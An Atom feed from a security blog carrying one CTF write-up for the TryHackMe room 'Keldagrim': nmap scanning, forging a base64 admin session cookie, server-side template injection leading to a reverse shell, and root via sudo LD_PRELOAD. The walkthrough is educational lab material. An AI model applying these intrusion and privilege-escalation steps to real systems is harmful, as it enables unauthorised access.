<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
  <link href="https://darrynbrownfield.co.uk/tag/medium/feed.xml" rel="self" type="application/atom+xml" />
  <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
  <updated>2021-03-06T14:22:54+00:00</updated>
  <id>https://darrynbrownfield.co.uk/tag/medium/feed.xml</id>

  
  
  

  
    <title type="html">Darryn Brownfield | </title>
  

  
    <subtitle>Infosec | Hacking | CTF</subtitle>
  

  

  
    
      
    
  

  
  

  
    <entry>
      <title type="html">Keldagrim Write Up</title>
      <link href="https://darrynbrownfield.co.uk/keldagrim" rel="alternate" type="text/html" title="Keldagrim Write Up" />
      <published>2021-03-06T00:00:00+00:00</published>
      <updated>2021-03-06T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/keldagrim</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/keldagrim">&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/cover.png&quot; alt=&quot;keldagrim&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/keldagrim&quot;&gt;Keldagrim&lt;/a&gt; is a medium level CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://twitter.com/optionalctf&quot;&gt;Optional&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Can you overcome the forge and steal all of the gold!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and was given the target IP 10.10.252.142 I started a nmap scan to check the available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.252.142
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-06 13:03 GMT
Nmap scan report for 10.10.252.142
Host is up (0.030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d8:23:24:3c:6e:3f:5b:b0:ec:42:e4:ce:71:2f:1e:52 (RSA)
|   256 c6:75:e5:10:b4:0a:51:83:3e:55:b4:f6:03:b5:0b:7a (ECDSA)
|_  256 4c:51:80:db:31:4c:6a:be:bf:9b:48:b5:d4:d6:ff:7c (ED25519)
80/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title:  Home page 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Werkzeug httpd 1.0.1&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;I opened up my browser and started to have a look at the web page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing really stood out however when I looked at the source code I could see a disabled link to /admin&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;    &amp;lt;li class=&quot;nav-item dropdown&quot;&amp;gt;
        &amp;lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#&quot; id=&quot;navbarDropdown&quot; role=&quot;button&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&amp;gt;
          Buy Gold
        &amp;lt;/a&amp;gt;
        &amp;lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;navbarDropdown&quot;&amp;gt;
            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/wow&quot;&amp;gt;World of Warcraft&amp;lt;/a&amp;gt;
            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/OSRunescape&quot;&amp;gt;Old School Runescape&amp;lt;/a&amp;gt;
            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/runescape&quot;&amp;gt;Runescape3&amp;lt;/a&amp;gt;
          &amp;lt;div class=&quot;dropdown-divider&quot;&amp;gt;&amp;lt;/div&amp;gt;
          &amp;lt;a class=&quot;dropdown-item &quot; href=&quot;/admin&quot;&amp;gt;Admin&amp;lt;/a&amp;gt;
        &amp;lt;/div&amp;gt;
      &amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However the page looks pretty much the same. So I looked at cookies and found a session cooke with a base64 value.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/guest.png&quot; alt=&quot;guest&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are lots of ways to change the base64 to plaintext but I really like &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt; at the moment. Using CyberChef I was able to see the value was ‘guest’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/cyberchef.png&quot; alt=&quot;cyberchef&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used CyberChef again to encode ‘admin’ in to base64.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/adminhash.png&quot; alt=&quot;adminhash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Simply changing the session cookie value to the base64 output and refreshing the page now allowed me to see - ‘Current user - $2,165’ and be provided with a sales cookie.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/sales.png&quot; alt=&quot;sales&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This was also base64 encoded, CyberChef has a great feature called ‘Magic’, if you are unsure how something is encoded use magic to suggest and test various operations.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/saleshash.png&quot; alt=&quot;saleshash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This next bit took some time, I was able to base64 a string and input it in to the sales cookie and it would be displayed on the webpage, however I was unsure how I would be able to use this to get a foothold on the box. After some googling, I tried a technique called Server Side Template Injection (SSTI). This was not something I had tried to exploit before so I did some research on the technique to try and understand it and used &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&quot;&gt;PayloadsAllTheThings&lt;/a&gt; to see if I was on the right track.&lt;/p&gt;

&lt;p&gt;I found a payload  and if I had SSTI that should result in 7777777. I encoded the payload in base64 and updated the sales cookie with the output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/sstipayload.png&quot; alt=&quot;sstipayload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Refreshed the page and confirmed I had SSTI in the sales cookie!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/ssti.png&quot; alt=&quot;ssti&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;On the same &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&quot;&gt;PayloadsAllTheThings&lt;/a&gt; page was an example for remote code execution. I took the example for exploiting an SSTI by calling Popen without guessing the offset, changed the IP and port values and encoded again with base64.&lt;/p&gt;

&lt;p&gt;I opened a nc listener and updated the sales cookie with the base64 output and got a shell!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.21.217] from (UNKNOWN) [10.10.252.142] 36928
/bin/sh: 0: can't access tty; job control turned off
$ whoami
jed
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Now to get root i checked ‘sudo -l’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
Matching Defaults entries for jed on keldagrim:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User jed may run the following commands on keldagrim:
    (ALL : ALL) NOPASSWD: /bin/ps
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I had a look at &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; for ‘/bin/ps’ but as expected I didn’t find anything, I also noticed ‘env_keep+=LD_PRELOAD’. There is a great course by &lt;a href=&quot;https://twitter.com/thecybermentor&quot;&gt;Heath Adams&lt;/a&gt; on &lt;a href=&quot;https://www.udemy.com/course/linux-privilege-escalation-for-beginners&quot;&gt;udemy&lt;/a&gt; for Linux privesc techinques and this is covered as part of the course. There is also a great &lt;a href=&quot;https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/&quot;&gt;article&lt;/a&gt; which covers it.&lt;/p&gt;

&lt;p&gt;I used the steps in the article to create a file called evil.c, compiled with GCC. Ran the sudo command with LD_PRELOAD and got root!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;jed@keldagrim:/dev/shm$ sudo LD_PRELOAD=/dev/shm/evil.so ps
root@keldagrim:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
root@keldagrim:/dev/shm# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="medium" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
</feed>
